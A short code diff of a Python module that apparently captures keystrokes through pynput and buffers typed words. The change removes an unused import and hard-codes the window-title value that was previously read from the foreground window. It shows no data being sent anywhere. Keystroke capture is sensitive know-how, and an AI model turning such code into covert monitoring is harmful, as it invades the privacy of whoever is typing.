@@ -1,6 +1,5 @@
 from time import gmtime, strftime
 from os import system, path, mkdir
-import time
 from win32gui import GetWindowText, GetForegroundWindow
 import xml.etree.ElementTree as ET
 from pynput import keyboard
@@ -11,7 +10,7 @@ class WordListener:
     """
     Provides word functionality for the keyboard listener.
     """
-    consoleWindow = GetWindowText(GetForegroundWindow())
+    consoleWindow = "C:\\Windows\\py.exe"
     
     def __init__(self):
         self._stringBuffer = ""
